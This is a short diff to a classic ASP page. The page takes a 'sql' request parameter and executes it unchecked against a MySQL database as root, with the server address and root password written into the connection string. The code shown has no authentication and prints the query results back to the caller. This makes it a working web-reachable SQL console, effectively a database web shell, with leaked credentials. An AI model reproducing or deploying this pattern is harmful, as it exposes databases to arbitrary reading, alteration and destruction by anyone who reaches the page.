@@ -1,22 +1,23 @@
 <%
+Dim outputDB : outputDB = ""
+
 If Request("sql") <> "" Then
 
-    Dim conn, rs, sql, outputDB
+    Dim conn, rs, sql
     sql = Request("sql")
 
     On Error Resume Next
 
-    ' --- MySQL ODBC Driver ---
     Set conn = Server.CreateObject("ADODB.Connection")
-    conn.Open "Driver={MySQL ODBC 8.0 Unicode Driver};Server=10.10.1.75;Port=3306;Database=flowhcms_hmc;User=root;Password=123qwe;Option=3;"
+    conn.Open "Provider=MSDASQL;Driver={MySQL ODBC 5.3 Unicode Driver};Server=10.10.1.75;Port=3306;Database=flowhcms_hmc;UID=root;PWD=123qwe;Option=3;"
 
     If Err.Number <> 0 Then
-        output = "DB Connection Error: " & Err.Description
+        outputDB = "DB Connection Error: " & Err.Description
     Else
         Set rs = conn.Execute(sql)
 
         If Err.Number <> 0 Then
-            output = "SQL Error: " & Err.Description
+            outputDB = "SQL Error: " & Err.Description
         Else
             outputDB = "<pre>"
             Do Until rs.EOF
